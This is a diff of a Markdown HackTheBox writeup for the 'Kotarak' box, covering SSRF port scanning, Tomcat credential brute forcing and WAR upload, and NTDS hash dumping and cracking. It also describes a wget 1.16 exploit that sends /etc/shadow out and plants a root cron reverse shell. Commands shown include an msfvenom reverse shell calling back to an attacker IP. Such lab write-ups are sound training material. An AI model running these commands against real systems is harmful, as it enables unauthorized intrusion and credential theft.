@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "HTB Writeup [Linux - Hard] - Kotarak"
-published: false
+published: true
 ---
 
 ![](/assets/Kotarak/Kotarak.png)
@@ -9,15 +9,15 @@ published: false
 ## Summary
 - **Kotarak** is a really fun box. it had **SSH**, an **Apache web server** and **Tomcat** listening on the outside.
 - *Even though the Tomcat was vulnerable to* [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938), that path didn't take us anywhere.
-- *Instead,* the **web page** on the **Apache** had a **Service-Side Request Forgery** which we could exploit to get further.
-- We used the **SSRF** to **enumerate the internal ports** and found a **web page which had a backup** of the `tomcat-users.xml` file.
+- *Instead,* the **web page** on the **Apache** had a **Server-Side Request Forgery** which we could exploit to get further.
+- We used the **SSRF** and `wfuzz` to **enumerate the open internal ports** and found a **web page which had a backup** of the `tomcat-users.xml` file.
 - That file **contained credentials** that we used to **upload a WAR reverse shell** and get on the box.
 - *On the file system,* we found an **Active Directory** `ntds.dit` **dump** which was apparently a remnant of a pentest.
 - We **extracted all the domain hashes** from that and cracked one of them for a password which belonged to the `atanas` local user.
 - *As* `atanas`, we came to **find a file owned by us** called `app.log` ***within the root folder.***
-- It contained past events of **another server using a vulnerable version** of `wget` to fetch data from ours.
-- *After finding a tool called* `authbind` (*which lets us use low ports without being root*) *installed on the system,* we use it to **deploy a python web server** and verify that ***there were indeed requests still being made to our machine.***
-- We set up **an elaborate exploit** to target the client's `wget` deploying a `cron` job to **run as root** and **give us a shell on the box.**
+- It contained past events of **another host using a vulnerable version** of `wget` to fetch data from ours.
+- *After finding a tool called* `authbind` *installed on the system* (*it lets you use low ports without being root*) we use it to **deploy a python web server** and verify that ***there were indeed requests still being made to our machine.***
+- We set up **an elaborate exploit** to target the client's `wget` enabling us to **plant a cron job** to **run as root** and **give us a shell on his box.**
 
 ---
 
@@ -44,14 +44,15 @@ PORT      STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-The **full range port** scan gets us that Apache on port 60000.
 
-The `http-title` nmap script gives us a hint that there's **custom content** there (Kotarak Web Hosting)
+The **full range port scan** gets us that **Apache on port 60000** as well as the **two Tomcat ports** 8009 and 8080 plus **SSH**.
+
+The `http-title` nmap script gives us a hint that there's **custom content** there (**Kotarak Web Hosting**)
 
 ## Quickly Testing Tomcat
-We will go over some fast checks here first because they **can get us RCE** if they work.
+We will go over some **fast checks** here first looking for **easy wins**.
 
-An error message was there instead of the standard home page.
+*when visiting port 8080,* we found **an error message** there **instead of the standard home page.**
 
 ![](/assets/Kotarak/tomcat-home-page-error.jpg)
 
@@ -69,7 +70,7 @@ but we need to **change up the list** to match the format that `hydra`'s `-C` fl
 
 ![](/assets/Kotarak/the-list-and-hydra-usage.jpg)
 
-a quick `sed` **replacing all spaces with colons** (`:`) takes care of that and we save the list to a file before launcing the attack
+a quick `sed` **replacing all spaces with colons** (`:`) takes care of that and we **save the list to a file** before launcing the attack
 
 ```bash
 hydra -C tomcat_user_pass_list.txt -s 8080 -f kotarak http-get /manager/html -vV
@@ -79,17 +80,17 @@ hydra -C tomcat_user_pass_list.txt -s 8080 -f kotarak http-get /manager/html -vV
 
 no luck though :/
 
-*Next,* we **check for exploits** using `searchsploit`
+*Next,* we **check for exploits** using `searchsploit` (our version is 8.5.5)
 
 ![](/assets/Kotarak/searchsploit-tomcat-8.jpg)
 
-we don't get a good match there.
+The only match was "Apache Tomcat 6/7/8/9 Information Disclosure" [CVE-2016-6816](https://nvd.nist.gov/vuln/detail/CVE-2016-6816). but it didn't seem of good use to us.
 
-*however,* we want to check if the famous **Ghostcat vulnerability** was there.
+*however,* we ought to check if the famous **Ghostcat vulnerability** [CVE-2020-1938](https://nvd.nist.gov/vuln/detail/CVE-2020-1938) was there.
 
-![](/assets/Kotarak/ghostcat-exploit-db.jpg)
+![](/assets/Kotarak/ghostcat-nvd.jpg)
 
-our version should be vulnerable. Let's use this [Github exploit](https://github.com/00theway/Ghostcat-CNVD-2020-10487) for testing:
+**our version should be vulnerable.** Let's use this [Github exploit](https://github.com/00theway/Ghostcat-CNVD-2020-10487) for testing:
 
 ![](/assets/Kotarak/ajpshooter-usage.jpg)
 
@@ -103,7 +104,7 @@ python ajpShooter.py http://kotarak:8080 8009 /WEB-INF/web.xml read
 
 ![](/assets/Kotarak/ajpshooter-works.jpg)
 
-We were able to read the `/WEB-INF/web.xml` file but there isn't anything useful in it. So we move on..
+We were **able to read** the `/WEB-INF/web.xml` file but **there wasn't anything useful in it**. So we move on..
 
 ## The Apache High Port
 *On port 60000,* we find this page:
@@ -112,17 +113,21 @@ We were able to read the `/WEB-INF/web.xml` file but there isn't anything useful
 
 none of the links on the left side work. But our senses are telling us that we **should check for SSRF here.**
 
-the page talks about browsing and the action for submission is to the `url.php` file. we should supply a URL here.
+That's because the page talks **about browsing**. *And, in the source code,* the form's **action for submission** is the `url.php` file.
+
+we have to **test a URL here as input.**
 
 ![](/assets/Kotarak/possible-ssrf-detection.jpg)
 
-we'll first test if it can reach us.
+we'll first test if it can connect back to us.
 
 So we stand up a **quick PHP web server** with `php -S 0.0.0.0:80` and supply the URL for our kali:
 
+**Note:** a normal python web server or netcat would still be OK. *I just felt like using PHP at the time XD*
+
 ![](/assets/Kotarak/ssrf-confirmed.jpg)
 
-vulnerability confirmed!
+we got a request back!
 
 ## Exploiting SSRF
 We're going to use `wfuzz` to see **what's listening on the box locally.**
@@ -135,11 +140,11 @@ we first do a **quick fuzz** over ports 8080 to 8090 to **see the reponses for o
 
 *alright, from the response size,* we **detect port 8080** which **we knew was up serving the tomcat**
 
-we can deduct that **there's nothing listening on the other ports** from the small responses (2 characters).
+we can deduce that **there's nothing listening on the other ports** from the small responses (2 characters).
 
 we will use the `--hh` flag to **exclude those responses** and **provide the full range of TCP ports** (1-65535) for fuzzing.
 
-Setting the `-t` flag to **50 concurrent connections** is good for speed since **we're going to do 65K+ requests** and we haven't got all day :D
+Setting the `-t` flag to **50 concurrent connections** is good ***for speed*** since **we're going to do 65K+ requests** and *we haven't got all day :D*
 
 ```bash
 wfuzz -t 50 --hh 2 -z range,1-65535 -c http://kotarak:60000/url.php?path=http://127.0.0.1:FUZZ
@@ -147,78 +152,80 @@ wfuzz -t 50 --hh 2 -z range,1-65535 -c http://kotarak:60000/url.php?path=http://
 
 ![](/assets/Kotarak/ssrf-portscan-results.jpg)
 
-a **big list of ports** comes up:
-- 22 (that's SSH)
+a **lot of ports** come up:
+- 22 (SSH)
 - 90
 - 110
 - 200
 - 320
 - 888
 - 3306 (mysql most likely)
-- 8080
-- and 60000
+- 8080 (tomcat)
+- and 60000 (the browser page)
 
-*checking the ports...*
+*checking the unknown ports...*
 
-**Port 90:** junk #1
+**Port 90:** junk
 
 ![](/assets/Kotarak/ssrf-port-90.jpg)
 
-**Port 110:** junk #2
+**Port 110:** junk too
 
 ![](/assets/Kotarak/ssrf-port-110.jpg)
 
-**Port 200:** third is a charm right? nope. junk #3
+**Port 200:** third is a charm right? nope. junk also :P
 
 ![](/assets/Kotarak/ssrf-port-200.jpg)
 
-**Port 320:** a login form! nope, the action field within the form is empty. junk #4 XD
+**Port 320:** a login form! but, the ***action field within the form is empty.*** junk for the 4th time :/
 
 ![](/assets/Kotarak/ssrf-port-320.jpg)
 
-**Port 888:** at last something interesting here
+**Port 888:** at last something interesting here xD
 
 ![](/assets/Kotarak/ssrf-port-888.jpg)
 
-we add the `?doc=backup` query to the url and use `curl` instead of clicking the link to get the file:
+*to get the file,* we add `?doc=backup` to the base url and use `curl` *instead of clicking the link.*
 
 ![](/assets/Kotarak/cred-found-on-888.jpg)
 
-**Creds :D**
+it turns out to be the `tomcat-users.xml` file. **we got creds!**
 
 ## WAR Shell Upload
-We first **verify the logins** with `hydra` before getting too excited xD
+*Before getting too excited,* we first **verify the logins** with `hydra`
 
 ![](/assets/Kotarak/hydra-verify-tomcat.jpg)
 
-**Oh, I love that color :D**
+Green! we're good to go
 
-Ok, let's **generate a WAR reverse shell** with `msfvenom`
+***To get remote code exectuion,*** we will need to **generate a WAR reverse shell** with `msfvenom`
 
 ```bash
 msfvenom -p java/shell_reverse_tcp lhost=10.10.16.5 lport=9000 -f war -o letmein.war
 ```
 
-and **upload the file** with `curl`
+and **upload the it** with `curl`
 ```bash
 curl -v -u admin:'3@g01PdhB!' --upload-file letmein.war "http://kotarak:8080/manager/text/deploy?path=/shell&update=true"
 ```
 
-and do another `curl` to **hit the endpoint for our shell**
+then do another `curl` to **hit the endpoint** and **trigger our shell**
 ```bash
 curl http://kotarak:8080/shell
 ```
 
+It should look like this:
+
 ![](/assets/Kotarak/shell-as-tomcat.jpg)
 
-**Sweet! :]**
+**We're in. Sweet :]**
 
 ## Lateral Movement
 *after getting our reverse shell,* we **improve it** like the usual:
 
 ![](/assets/Kotarak/shell-improvement.jpg)
 
-and we `source` the `.bashrc` file from the `atanas` user for colors :P
+and we `source` the `.bashrc` file from the `atanas` user for a colored output.
 
 ![](/assets/Kotarak/getting-colors-in-our-session.jpg)
 
@@ -228,17 +235,17 @@ and we `source` the `.bashrc` file from the `atanas` user for colors :P
 
 the **keywords** here are:
 - the **1st file's name:** **NTDS** (this is the name of the **Active Directory database file** `ntds.dit`)
-- the **2nd file's type:** **MS Windows Registry** file (*probably the system hive containing the boot key needed to extract hashes*)
+- the **2nd file's type:** **MS Windows Registry** file (*probably the* ***system hive*** *containing the* ***boot key*** *needed to* ***extract hashes***)
 
 **these two components are enough for us to get all the domain hashes within.**
 
 [Impacket](https://github.com/SecureAuthCorp/impacket)'s `secretsdump.py` script can easily take care of this.
 
-we're first going to **transfer those files over** to kali to **get dumping and get cracking :]**
+we're first going to **transfer those files over** to kali to **dump those hashes and try to crack them**
 
 ![](/assets/Kotarak/transfer-ad-dump.jpg)
 
-*after renaming the .dit file to* `ntds.dit` *and the .bin file to* `system`, we **dump the hashes:**
+*after renaming the .dit file to* `ntds.dit` *and the .bin file to* `system`, we run:
 
 ```bash
 secretsdump.py -just-dc-ntlm -ntds ntds.dit -system system local
@@ -246,7 +253,7 @@ secretsdump.py -just-dc-ntlm -ntds ntds.dit -system system local
 
 ![](/assets/Kotarak/secrets-dump.jpg)
 
-**Awesome!** let's pass this to `hashcat`
+We then pass those to `hashcat`
 
 ```bash
 hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
@@ -258,28 +265,30 @@ the hash that cracked belonged to the `administrator` user.
 
 ![](/assets/Kotarak/knowing-which-hash-was-cracked.jpg)
 
-*However, just to be sure,* we're going to try it with both `root` and `atanas`. there were no other users locally.
+*However, just to be sure,* we're going to try it with both `root` and `atanas`. since we didn't find other users locally with a proper shell.
 
 ![](/assets/Kotarak/finding-local-linux-users.jpg)
 
-failed with `root` as expected :) but worked with `atanas`
+it failed with `root` but worked with `atanas`
 
 ![](/assets/Kotarak/shell-as-atanas.jpg)
 
 ## Unusual Activity
-we run [LinPEAS](https://github.com/carlospolop/PEASS-ng) and see something very strange:
+*Starting on privesc,* we ran [LinPEAS](https://github.com/carlospolop/PEASS-ng) and **saw something very strange:**
 
 ![](/assets/Kotarak/root-files.jpg)
 
 we own files in `/root`?
 
-*to confirm,* we run a `find` command. and take a look inside the files owned by us:
+*to confirm,* we run a `find` command and checked the files owned by us:
+- `flag.txt`
+- `app.log`
 
 ![](/assets/Kotarak/activity-detected.jpg)
 
-we notice a few things in the `app.log` file:
+*Looking above,* you can see a few things in the `app.log` file:
 1. there's **another machine's IP:** 10.0.3.133
-2. *back in 2017 (when the box first came out),* it executed `wget` 3 times *-each 2 minutes apart-* to **get a file** called `archive.tar.gz` which it couldn't get (it got a 404 not found)
+2. *looking at the dates, back in 2017 (when the box first came out),* it executed `wget` 3 times *-each 2 minutes apart-* to **get a file** called `archive.tar.gz` which it couldn't get (it got a 404 not found)
 3. it was **using an older version** of `wget` (1.16)
 
 we make **a couple of checks** to see what's going on:
@@ -294,25 +303,25 @@ we look up **exploit-db** for that version of `wget` before moving on
 
 ![](/assets/Kotarak/wget-searchsploit.jpg)
 
-we're shocked to see an actual exploit for `wget`
+there was actually an exploit for `wget`!
 
 ## Elaborate Client Exploitation and Privilege Escalation
-We've seen **Client-Side attacks** before. *But for some odd reason,* **exploiting a command-line tool** felt weird :D
+**Client-Side attacks** aren't new. *But for some odd reason,* **exploiting a command-line tool** felt weird :D
 
 *Anyway,* we **check out exploit's details** on [Exploit-db](https://www.exploit-db.com/exploits/40064)
 
 It was a very interesting read. *To sum it up,* the scenario is:
 - if a victim is using `wget` 1.16 to download a file **from a server that we control.**
-- *if* `wget` *was used* **without an output being specified** *(using the* `-O` *flag)*, it would **save in the current working directory** which could potentially be ***the user's home folder.***
+- *and* `wget` *was used* ***without an output being specified*** *(using the* `-O` *flag)*, it would **save in the current working directory**. which could potentially be ***the user's home folder.***
 - *to exploit a situation like that,* we have to **set up a web server** that **will respond with a redirect to an FTP server serving a malicious** `.wgetrc` file.
-- that file would then be **saved to the victim's home folder** becoming `wget`'s main configuration.
+- that file would then be **saved to the victim's home folder** becoming `wget`'s main configuration. since it would search for it there first.
 - It would **specify that upcoming downloads** should have `/etc/cron.d/wget-root-shell` as their output location.
 - that configuration would also have the client issue **POST** requests containing his `/etc/shadow`.
 - *If everything works, on the second request to our server,* the victim's `/etc/shadow` would be there in the request body.
 - And it would **save our then-hosted reverse shell as a cron job** called `wget-root-shell` in their `/etc/cron.d` folder.
 - *Having registered a* `cron` *job for that user,* we would **get a reverse shell** in the upcoming minute.
 
-**hopefully this would make more sense in demonstration :D**
+**hopefully this would make more sense in demonstration below :D**
 
 *Alright, to perform this exploit,* we need to be able to **serve a website on the machine on port 80** and **verify we're still getting requests** from a **vulnerable** `wget` **web client.**
 
@@ -320,23 +329,19 @@ It was a very interesting read. *To sum it up,* the scenario is:
 
 the only way around this is installing a tool called `authbind` (*which also requires* `root` *permission*).
 
-was this a rabbit hole?
-
-let's first check. maybe that tool is already here.
+let's first check to see that tool was there or not.
 
 ![](/assets/Kotarak/authbind-installed.jpg)
 
-it's there! and we're probably on the right track :)
+it's there! we're now **more confident** of **being on the right track**
 
 *with it,* we set up a `python` web server on port 80 and **wait to detect any incoming web requests.**
-
-and we get one!
 
 ![](/assets/Kotarak/getting-an-http-request.jpg)
 
 We also check the python `pyftpdlib` module **which we will need as our FTP server.**
 
-*And, if that wasn't there, in theory,* we could set it up on kali and still be good.
+*And, if that wasn't there,* we should be able to set it up on our kali and still be good.
 
 ![](/assets/Kotarak/python-ftp-is-there.jpg)
 
@@ -354,7 +359,7 @@ we set this up following the instructions on Exploit-DB
 
 *However, since we already use* `tmux` *on our kali,* we're going **to change the bind key** to **be able to interact with both** `tmux` **instances.**
 
-here's what the `.tmux.conf` file in `atanas`'s home directory should look like:
+here's what the `~/.tmux.conf` file should look like:
 
 ```
 set-option -g prefix C-a
@@ -399,7 +404,7 @@ and **we're making the 10.10.10.55 machine catch the shell** because **we're not
 
 ### Step #3: Receiving the first wget
 
-A few moments after starting the FTP server and the `python` exploit, we caught something.
+*A few moments after starting the FTP server and the* `python` *exploit,* we caught something.
 
 ![](/assets/Kotarak/wget-exploit-and-ftp-together.jpg)
 
@@ -409,16 +414,16 @@ A few moments after starting the FTP server and the `python` exploit, we caught 
 
 *Two more minutes after,* we **get the POST request** containing the `/etc/shadow` file.
 
-That's enough proof that our victim is the `root` user. *or at least a user who can read the shadow file :)*
+That's enough proof that our victim is the `root` user. *or at least one who can read the shadow file*
 
-The exploit now **served the** `cron` **containing our reverse shell** and **it was downloaded by the victim** in their `/etc/cron.d`
+The exploit now **served the** `cron` **containing our reverse shell** and **it was downloaded by the victim** to their `/etc/cron.d`
 
 ![](/assets/Kotarak/receiving-the-shadow-file-and-deploying-cron.jpg)
 
-### Step #5: Receiving the connect back
+### Step #5: Receiving the Shell
 
-*One minute later,* the `cron` job started and **sent us back our root shell :D**
+*One minute after,* the `cron` job started and **sent us back our root shell :D**
 
 ![](/assets/Kotarak/rooted.jpg)
 
-**Just amazing <3 :D**
+**Just amazing :D**
